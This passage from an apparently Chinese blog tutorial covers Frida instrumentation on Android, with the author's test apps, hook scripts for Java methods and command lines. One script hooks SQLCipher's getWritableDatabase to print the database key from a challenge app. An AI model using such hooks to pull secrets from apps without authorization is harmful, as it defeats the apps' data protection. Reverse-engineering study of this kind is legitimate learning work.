class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)      </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.14.png" class="" title="动态调用"><p>静态调用直接打印就好：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;!!!---!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n tolowercase&quot;</span>,fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x)</span>&#123;</span><br><span class="line">        total += x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">secret2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="title function_">secret2</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke secret2:&quot;</span>, result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.13.png" class="" title="静态调用"><h2 id="2-6-例子"><a href="#2-6-例子" class="headerlink" title="2.6 例子"></a>2.6 例子</h2><p>同样用app3做例子，在1.8上讲过，先hook <code>getWritableDatabase()</code>方法，再主动调用MainActivity类中的<code>a()</code>方法。</p><p>因为<code>getWritableDatabase()</code>方法有重载，所以我们把所有重载都hook上看看。还要知道该方法是动态的还是静态的，使用动静态处理。由于<code>a()</code>方法在App完全启动前就加载了，所以如果想再次执行，需要主动调用该方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app3.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;</span>).<span class="property">getWritableDatabase</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getWritableDatabase</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1 string, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;</span>).<span class="property">getWritableDatabase</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getWritableDatabase</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1 char[], result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数回调，注入代码立即执行</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br><span class="line"></span><br><span class="line"><span class="comment">//主动调用，动态处理找实例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.yaphetshan.tencentwelcome.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke instance.a:&quot;</span>,instance.<span class="title function_">a</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数回调，3s后执行invoke函数</span></span><br><span class="line"><span class="built_in">setTimeout</span>(invoke,<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.example.yaphetshan.tencentwelcome -l app3.js </span><br><span class="line">invoke()</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.6.1.png" class="" title="主动调用"><h1 id="3-frida构造数组、对象、Map和类参数"><a href="#3-frida构造数组、对象、Map和类参数" class="headerlink" title="3. frida构造数组、对象、Map和类参数"></a>3. frida构造数组、对象、Map和类参数</h1><h2 id="3-1-构造数组"><a href="#3-1-构造数组" class="headerlink" title="3.1 构造数组"></a>3.1 构造数组</h2><p>先将每个字逐个hook出来，也就是使用<code>Character.toString()</code>方法那一条语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;onCreate: SimpleArray&quot;</span>);</span><br><span class="line">        <span class="type">char</span> arr[][] = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">4</span>][];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;春&#x27;</span>,<span class="string">&#x27;眠&#x27;</span>,<span class="string">&#x27;不&#x27;</span>,<span class="string">&#x27;觉&#x27;</span>,<span class="string">&#x27;晓&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;闻&#x27;</span>,<span class="string">&#x27;啼&#x27;</span>,<span class="string">&#x27;鸟&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;夜&#x27;</span>,<span class="string">&#x27;来&#x27;</span>,<span class="string">&#x27;风&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;声&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;花&#x27;</span>,<span class="string">&#x27;落&#x27;</span>,<span class="string">&#x27;知&#x27;</span>,<span class="string">&#x27;多&#x27;</span>,<span class="string">&#x27;少&#x27;</span>&#125;;</span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;-----横板-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysToString&quot;, Arrays.toString(arr[i]));</span></span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysStringBytes&quot;,Arrays.toString(Arrays.toString(arr[i]).getBytes()));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,Character.toString(arr[i][j]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Character&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;char&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.v5le0n9.test02 -l test02.js --no-pause</span><br></pre></td></tr></table></figure><ul><li>-f：spawn模式，frida 重新打开进程。没有-f默认为attach模式，附加在打开的进程。</li></ul><img src="/posts/ab7319a3/3.1.1.png" class=""><img src="/posts/ab7319a3/3.1.2.png" class=""><p>hook出不来，咋办？如何主动调用<code>onCreate()</code>方法？</p><p>接下来将一整行hook出来，也就是使用<code>Arrays.toString()</code>方法那一条语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;onCreate: SimpleArray&quot;</span>);</span><br><span class="line">        <span class="type">char</span> arr[][] = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">4</span>][];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;春&#x27;</span>,<span class="string">&#x27;眠&#x27;</span>,<span class="string">&#x27;不&#x27;</span>,<span class="string">&#x27;觉&#x27;</span>,<span class="string">&#x27;晓&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;闻&#x27;</span>,<span class="string">&#x27;啼&#x27;</span>,<span class="string">&#x27;鸟&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;夜&#x27;</span>,<span class="string">&#x27;来&#x27;</span>,<span class="string">&#x27;风&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;声&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;花&#x27;</span>,<span class="string">&#x27;落&#x27;</span>,<span class="string">&#x27;知&#x27;</span>,<span class="string">&#x27;多&#x27;</span>,<span class="string">&#x27;少&#x27;</span>&#125;;</span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;-----横板-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;SimpleArraysToString&quot;</span>, Arrays.toString(arr[i]));</span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysStringBytes&quot;,Arrays.toString(Arrays.toString(arr[i]).getBytes()));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">                <span class="comment">//Log.d(&quot;SimpleArray&quot;,Character.toString(arr[i][j]));</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.3.png" class=""><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>我一直hook不出来，只能盗图了。</p><img src="/posts/ab7319a3/3.1.4.png" class=""><p>要想打印Java对象的内容，需要Google的json包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="comment">//打印Java对象的内容可以使用json包</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args1), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.5.png" class=""><p>接下来正式进行构造数组的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> charArray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;char&#x27;</span>, [<span class="string">&#x27;一&#x27;</span>,<span class="string">&#x27;去&#x27;</span>,<span class="string">&#x27;二&#x27;</span>,<span class="string">&#x27;三&#x27;</span>,<span class="string">&#x27;里&#x27;</span>])</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(charArray)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;charArray, result&quot;</span>, gson.$new().<span class="title function_">toJson</span>(charArray), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.6.png" class=""><p>修改返回值更简单，因为返回的是一个字符串，直接在返回处写字符串即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//return &quot;烟村四五家&quot;</span></span><br><span class="line"><span class="comment">//return Java.use(&quot;java.lang.String&quot;).$new(&quot;烟村四五家&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;char&#x27;</span>, [<span class="string">&#x27;烟&#x27;</span>,<span class="string">&#x27;村&#x27;</span>,<span class="string">&#x27;四&#x27;</span>,<span class="string">&#x27;五&#x27;</span>,<span class="string">&#x27;家&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>可以在LogCat中看到返回值已被修改。</p><p>继续hook<code>Arrays.toString()</code>方法，只是传入的参数不一样了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span 